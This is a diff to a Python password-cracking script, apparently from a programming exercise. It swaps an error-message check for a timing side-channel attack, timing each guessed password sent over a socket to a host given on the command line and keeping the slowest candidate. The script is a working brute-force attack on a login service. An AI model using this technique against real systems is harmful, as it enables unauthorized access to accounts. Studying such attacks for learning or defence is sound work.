@@ -4,7 +4,7 @@ import string
 import itertools
 import os
 import json
-
+from time import time
 
 def try_password(login):
     request = {"login": login, "password": ""}
@@ -13,14 +13,20 @@ def try_password(login):
         for data in possibilities:
             request["password"] = password + "".join(data)
             data_send = json.dumps(request).encode()
+            start = time()
             client_socket.send(data_send)
             response = json.loads(client_socket.recv(1024).decode())
-            if response["result"] == "Exception happened during login":
-                password = request["password"]
-                break
+            diff_time = time() - start
+            dict[request["password"]] = diff_time
+            #if response["result"] == "Exception happened during login":
+            #    password = request["password"]
+            #    break
             if response["result"] == "Connection success!":
                 print(json.dumps(request))
                 return
+        ordered = {k: v for k, v in sorted(dict.items(), key=lambda item: item[1])}
+        password = ordered.popitem()[0]
+        dict.clear()
 
 
 # Trying to find the login
@@ -47,7 +53,8 @@ client_socket = socket.socket()
 hostname = sys.argv[1]
 port = int(sys.argv[2])
 address = (hostname, port)
-
+#dictionary password:time
+dict = dict()
 # connecting to the server
 client_socket.connect(address)
 possibilities = string.ascii_letters + string.digits
